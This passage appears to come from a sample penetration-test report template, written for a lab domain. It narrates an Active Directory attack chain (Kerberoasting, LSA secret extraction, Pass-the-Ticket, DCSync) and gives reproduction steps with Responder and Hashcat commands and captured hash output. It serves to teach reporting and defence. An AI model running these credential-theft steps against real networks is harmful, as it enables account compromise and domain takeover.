{"text": "Upon review, the tester found that multiple privileged users existed in the domain configured with Service Principal Names (SPNs), which can be leveraged to perform a Kerberoasting attack and retrieve TGS Kerberos tickets for the accounts which can be cracked offline using Hashcat if a weak password is set. From here, the tester used the GetUserSPNs.py tool to carry out a targeted Kerberoasting attack against the mssqlsvc account, having found that the mssqlsvc account had local administrator rights over the host SQL01.INLANEFREIGHT.LOCAL which was an interesting target in the domain. 4. The tester was able to successfully crack this account's password offline, revealing the clear text value. 5. The tester was able to authenticate to the host SQL01.INLANEFREIGHT.LOCAL and retrieve a clear text password from the host's registry by decrypting LSA secrets for an account (srvadmin) which was set up for autologon. 6. This srvadmin account had local administrator rights over all servers (aside from Domain Controllers) in the domain so the tester was able to log into the MS01.INLANEFREIGHT.LOCAL host and retrieve a Kerberos TGT ticket for a logged in user, pramirez, who was part of the Tier I Server Admins group which granted the account DCSync rights over the domain object. This attack can be utilized to retrieve the NTLM password hash for any user in the domain, resulting in domain compromise and persistence via a Golden Ticket. 7. The tester used the Rubeus tool to extract the Kerberos TGT ticket for the pramirez user and perform a Pass-the- Ticket attack to authenticate as this user. 8. Finally, the tester was able to perform a DCSync attack after successfully authenticating with this user account via the Mimikatz tool which ended in domain compromise. 9\\nDetailed reproduction steps for this attack chain are as follows: Upon connecting to the network, the tester started the Responder tool and was able to capture a password hash for the bsmith user by spoofing NBT-NS/LLMNR traffic on the local network segment. $ sudo responder -I eth0 -wrfv __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR & MDNS Responder 3.0.6.0 <SNIP> [+] Generic Options: Responder NIC [eth0] Responder IP [192.168.195.168] Challenge set [random] Don't Respond To Names ['ISATAP'] [+] Current Session Variables: Responder Machine Name [WIN-TWWXTGD94CV] Responder Domain Name [3BKZ.LOCAL] Responder DCE-RPC Port [47032] [+] Listening for events... <SNIP> [SMB] NTLMv2-SSP Client : 192.168.195.205 [SMB] NTLMv2-SSP Username : INLANEFREIGHT\\bsmith [SMB] NTLMv2-SSP Hash : bsmith::INLANEFREIGHT:7ecXXXXXX98ebcigure 1: Retrieving Password Hash with Responder The tester was able to \"crack\" this password hash offline using the Hashcat tool and retrieve the clear text password value, thus granting a foothold to enumerate the Active Directory domain. $ hashcat -m 5600 bsmith_hash /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... <SNIP> Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 BSMITH::INLANEFREIGHT:7eccd965c4b98ebc:73d1b2c8c5f9861eefd31bb45085a651:010100000000000000b588d9f766d801191bb 2236a5faaa50000000002000800330042004b005a0001001e00570049004e002d00540057005700580054004700440039003400430056 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX004700440039003400430056002e00330042004b005a0 02e004c004f00430041004c0003001400330042004b005a002e004c004f00430041004c0005001400330042004b005a002e004c004f00 430041004c000700080000b588d9f766d801060004000200000008003000300000000000000001000000002000002cae5bf3bb1fd2f84 6a280aef43a8809c15207bfcb4df5a580ba1b6fcaf6bbce0a001000000000000000000000000000000000000900280063006900660073 002f003100390032002e003100360038002e003100390035002e00310036003800000000000000000000000000:<REDACTED> Figure 2: Cracking Password Hash with Hashcat The tester proceeded", "metadata": {"doc_id": "Hack the Box - sample-penetration-testing-report-template", "chunk_id": 4}}